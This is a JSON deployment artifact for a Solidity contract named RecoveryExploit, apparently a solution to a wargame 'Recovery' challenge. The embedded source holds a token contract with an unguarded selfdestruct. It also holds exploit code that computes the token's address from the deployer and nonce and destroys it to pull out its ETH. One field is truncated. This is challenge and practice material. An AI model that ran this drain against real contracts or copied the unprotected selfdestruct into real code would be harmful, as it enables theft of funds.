{
  "address": "0x4787229b79A119396674d7327FaE76b0e169fDD3",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "internalType": "uint8",
          "name": "nonce",
          "type": "uint8"
        }
      ],
      "name": "destroySimpleToken",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "sender",
          "type": "address"
        },
        {
          "internalType": "uint8",
          "name": "nonce",
          "type": "uint8"
        }
      ],
      "name": "getDeployedContractAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    }
  ],
  "transactionHash": "0xd42f043f0b76bffe7751a21b1ff17e6039e08adf8fa28c3cade7887289b9171b",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0x4787229b79A119396674d7327FaE76b0e169fDD3",
    "transactionIndex": 19,
    "gasUsed": "254036",
    "logsBloom": "0x
    "blockHash": "0xc9d0f8138157743143b2fd06989e2f8ba18545a13fd9c334f85ef86bba5d471e",
    "transactionHash": "0xd42f043f0b76bffe7751a21b1ff17e6039e08adf8fa28c3cade7887289b9171b",
    "logs": [],
    "blockNumber": 8396293,
    "cumulativeGasUsed": "10722055",
    "status": 1,
    "byzantium": true
  },
  "args": [],
  "numDeployments": 1,
  "solcInputHash": "a9c120e59ca90d59c1551886aaf95d0c",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"nonce\",\"type\":\"uint8\"}],\"name\":\"destroySimpleToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"nonce\",\"type\":\"uint8\"}],\"name\":\"getDeployedContractAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"pure\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Recovery.sol\":\"RecoveryExploit\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Recovery.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract Recovery {\\n    //-n address simple token\\n    //-n this is not part of the contest - I'm just storing it to write a test case\\n    address public token;\\n\\n    //-n constructor to receive eth\\n    constructor() payable {}\\n\\n    //generate tokens\\n    function generateToken(string memory _name, uint256 _initialSupply) public {\\n        token = address(new SimpleToken(_name, msg.sender, _initialSupply)); //-n this is added just to recoed token address\\n    }\\n\\n    //-n added this function to execute a eth transfer to simple token contract to mint more tokens\\n    function mintTokensforEth() public {\\n        (bool success, ) = payable(token).call{value: address(this).balance}(\\\"\\\");\\n        require(success, \\\"invalid transfer\\\");\\n    }\\n}\\n\\ncontract RecoveryExploit {\\n    //-n key challenge in this contract to back compute the address of the SimpleToken contract deployed by Recovery address\\n    //-n we use the deterministic formula below to get the address deployed by sender at a given nonce\\n    function getDeployedContractAddress(address sender, uint8 nonce) public pure returns (address) {\\n        return\\n            address(\\n                uint160(\\n                    uint256(\\n                        keccak256(\\n                            abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(nonce))\\n                        )\\n                    )\\n                )\\n            );\\n    }\\n\\n    //-n get the simple token at a given address\\n    //-n call destroy function to transfer all ETH in the simple token contract to Recovery contract\\n    function destroySimpleToken(address addr, uint8 nonce) public {\\n        SimpleToken s = SimpleToken(payable(getDeployedContractAddress(addr, nonce)));\\n\\n        s.destroy(payable(addr));\\n    }\\n}\\n\\ncontract SimpleToken {\\n    string public name;\\n    mapping(address => uint) public balances;\\n\\n    // constructor\\n    constructor(string memory _name, address _creator, uint256 _initialSupply) {\\n        name = _name;\\n        balances[_creator] = _initialSupply;\\n    }\\n\\n    // collect ether in return for tokens\\n    receive() external payable {\\n        balances[msg.sender] = msg.value * 10;\\n    }\\n\\n    // allow transfers of tokens\\n    function transfer(address _to, uint _amount) public {\\n        require(balances[msg.sender] >= _amount);\\n        balances[msg.sender] = balances[msg.sender] - _amount;\\n        balances[_to] = _amount;\\n    }\\n\\n    // clean up after ourselves\\n    function destroy(address payable _to) public {\\n        selfdestruct(_to);\\n    }\\n}\\n\",\"keccak256\":\"0x96026960ea3e451ba90b07bf63b71cd0929fd893153b9238a48b8006b3519d4e\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x608060405234801561001057600080fd5b506103a4806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806358b99b6c1461003b5780636036426b14610057575b600080fd5b610055600480360381019061005091906101e5565b610087565b005b610071600480360381019061006c91906101e5565b610104565b60405161007e9190610234565b60405180910390f35b60006100938383610104565b90508073ffffffffffffffffffffffffffffffffffffffff1662f55d9d846040518263ffffffff1660e01b81526004016100cd9190610270565b600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050505050565b600060d660f81b609460f81b848460f81b6040516020016101289493929190610320565b6040516020818303038152906040528051906020012060001c905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101798261014e565b9050919050565b6101898161016e565b811461019457600080fd5b50565b6000813590506101a681610180565b92915050565b600060ff82169050919050565b6101c2816101ac565b81146101cd57600080fd5b50565b6000813590506101df816101b9565b92915050565b600080604083850312156101fc576101fb610149565b5b600061020a85828601610197565b925050602061021b858286016101d0565b9150509250929050565b61022e8161016e565b82525050565b60006020820190506102496000830184610225565b92915050565b600061025a8261014e565b9050919050565b61026a8161024f565b82525050565b60006020820190506102856000830184610261565b92915050565b60007fff0000000000000000000000000000000000000000000000000000000000000082169050919050565b6000819050919050565b6102d26102cd8261028b565b6102b7565b82525050565b60008160601b9050919050565b60006102f0826102d8565b9050919050565b6000610302826102e5565b9050919050565b61031a6103158261016e565b6102f7565b82525050565b600061032c82876102c1565b60018201915061033c82866102c1565b60018201915061034c8285610309565b60148201915061035c82846102c1565b6001820191508190509594505050505056fea2646970667358221220c0d63403748c3fa8b43a615e567b76839942771ce34dbe093aab50074b8d8efa64736f6c63430008110033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100365760003560e01c806358b99b6c1461003b5780636036426b14610057575b600080fd5b610055600480360381019061005091906101e5565b610087565b005b610071600480360381019061006c91906101e5565b610104565b60405161007e9190610234565b60405180910390f35b60006100938383610104565b90508073ffffffffffffffffffffffffffffffffffffffff1662f55d9d846040518263ffffffff1660e01b81526004016100cd9190610270565b600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b50505050505050565b600060d660f81b609460f81b848460f81b6040516020016101289493929190610320565b6040516020818303038152906040528051906020012060001c905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101798261014e565b9050919050565b6101898161016e565b811461019457600080fd5b50565b6000813590506101a681610180565b92915050565b600060ff82169050919050565b6101c2816101ac565b81146101cd57600080fd5b50565b6000813590506101df816101b9565b92915050565b600080604083850312156101fc576101fb610149565b5b600061020a85828601610197565b925050602061021b858286016101d0565b9150509250929050565b61022e8161016e565b82525050565b60006020820190506102496000830184610225565b92915050565b600061025a8261014e565b9050919050565b61026a8161024f565b82525050565b60006020820190506102856000830184610261565b92915050565b60007fff0000000000000000000000000000000000000000000000000000000000000082169050919050565b6000819050919050565b6102d26102cd8261028b565b6102b7565b82525050565b60008160601b9050919050565b60006102f0826102d8565b9050919050565b6000610302826102e5565b9050919050565b61031a6103158261016e565b6102f7565b82525050565b600061032c82876102c1565b60018201915061033c82866102c1565b60018201915061034c8285610309565b60148201915061035c82846102c1565b6001820191508190509594505050505056fea2646970667358221220c0d63403748c3fa8b43a615e567b76839942771ce34dbe093aab50074b8d8efa64736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [],
    "types": null
  }
}